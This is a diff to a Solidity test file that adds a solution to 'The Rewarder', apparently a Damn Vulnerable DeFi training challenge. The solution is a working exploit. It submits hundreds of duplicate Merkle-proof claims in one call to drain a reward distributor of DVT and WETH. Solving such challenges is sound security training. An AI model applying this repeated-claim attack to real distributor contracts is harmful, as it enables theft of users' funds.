@@ -148,7 +148,61 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // This is the player's address
+        // 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
+
+        // Get the address position in the files with:
+        /*
+          python3 -c "import json; \
+            data = json.load(open('./test/the-rewarder/dvt-distribution.json')); \
+            print(next((i for i, item in enumerate(data) if item['address'] == '0x44E97aF4418b7a17AABD8090bEA0A471a366305C'), None))"
+
+          python3 -c "import json; \
+            data = json.load(open('./test/the-rewarder/weth-distribution.json')); \
+            print(next((i for i, item in enumerate(data) if item['address'] == '0x44E97aF4418b7a17AABD8090bEA0A471a366305C'), None))"
+        */
+        // It's 188.
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        // See 10000000000000000000 / 11524763827831882 = 867.696739767488
+        // See 1000000000000000000 / 1171088749244340 = 853.9062480493154
+        uint16 numberOfClaimsDVT = 867;
+        uint16 numberOfClaimsWETH = 853;
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+        Claim[] memory claims = new Claim[](numberOfClaimsDVT + numberOfClaimsWETH);
+
+        for (uint16 i = 0; i < numberOfClaimsDVT; i++) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: 11524763827831882, // See dvt-distribution.json
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, 188)
+            });
+        }
+
+        for (
+            uint16 i = numberOfClaimsDVT;
+            i < numberOfClaimsDVT + numberOfClaimsWETH;
+            i++)
+        {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: 1171088749244340, // See weth-distribution.json
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, 188)
+            });
+        }
+
+        // Attack!
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        // Send the funds to the recovery account.
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
